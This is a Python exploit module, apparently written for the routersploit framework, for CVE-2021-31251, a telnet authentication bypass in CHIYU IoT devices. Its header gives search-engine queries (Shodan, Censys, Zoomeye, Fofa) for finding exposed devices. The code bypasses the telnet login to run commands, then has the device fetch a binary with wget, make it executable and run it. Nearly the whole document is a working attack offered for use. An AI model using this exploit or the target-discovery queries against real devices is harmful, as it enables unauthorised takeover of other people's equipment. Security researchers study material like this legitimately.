'''
Exploit Title: CHIYU IoT Devices - 'Telnet' Authentication Bypass
Software Link: https://www.chiyu-tech.com/category-hardware.html
Version:  BF-430, BF-431, BF-450M, and SEMAC   - all firmware versions < June 2021
Tested on:  BF-430, BF-431, BF-450M, and SEMAC
CVE: CVE-2021-31251
Publication: https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks

Shodan search: WWW-Authenticate: Basic realm="CHIYU"
Censys search: services.http.response.headers.www_authenticate:"Basic realm=\"CHIYU\""
Zoomeye search: "Www-Authenticate\\: Basic realm=\"CHIYU\"" +after:"2021-04-14"
Fofa search: "Www-Authenticate: Basic realm=\"CHIYU\""
'''
import socket
import time

from routersploit.core.exploit import shell
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.printer import log
from routersploit.core.http.http_client import HTTPClient


socket.setdefaulttimeout(10)


class Exploit(HTTPClient):
    __info__ = {'name': 'CHIYU IoT Devices Authentication Bypass'}

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    telnet_port = OptPort(23, "Target telnet port")

    def execute(self, cmd: str) -> str:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            connect = s.connect_ex((self.target, self.telnet_port))
            try:
                print_status("[+] Try to connect to %s", self.target)
                time.sleep(1)
                s.send(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
                s.recv(1024).strip()
                s.send(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
                s.recv(1024).strip()
                s.send(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
                result = s.recv(1024).strip()
                if result != b'\xff\xfe\x01':
                    s.send(b"\x09")
                    result = s.recv(1024).strip()

                if connect == 0 and "sername" not in str(result):
                    if b"\xff\xfe\x01" == result:
                        print_status("Connected! ;)")

                        body = cmd + "\n"
                        s.send(body.encode('utf-8', 'ignore'))
                        result = s.recv(1024).decode('utf8', 'ignore')

                        if len(result) == 0:
                            print_error("[+] CHIYU device not available, try again ... (terminating)")
                            s.close()
                            return ''
                        b = "\n"
                        s.send(b.encode('utf-8', 'ignore'))
                        s.recv(1024).decode()
                        return result
            except Exception:
                s.close()
        except socket.error:
            print_error("[+] Unable to connect to CHIYU device.")
        return ''

    def check(self) -> bool:
        response = self.http_request(method="GET", path='/')
        if response:
            if response.headers.get('WWW-Authenticate') and "CHIYU" in response.headers['WWW-Authenticate']:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                try:
                    s.connect_ex((self.target, self.telnet_port))
                except socket.error:
                    return False
                finally:
                    s.close()
                return True
        return False

    def run(self):
        if self.check():
            print_success("Target seams %s:%d is vulnerable", self.target, self.port)
            shell(
                self,
                architecture="armle",
                method="wget",
                location="/var/",
                exec_binary=['chmod 777 {}', '{}']
            )
            # print_status('Target: %s:%d => output: "%s"', self.target, self.port, self.execute(self.command))
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
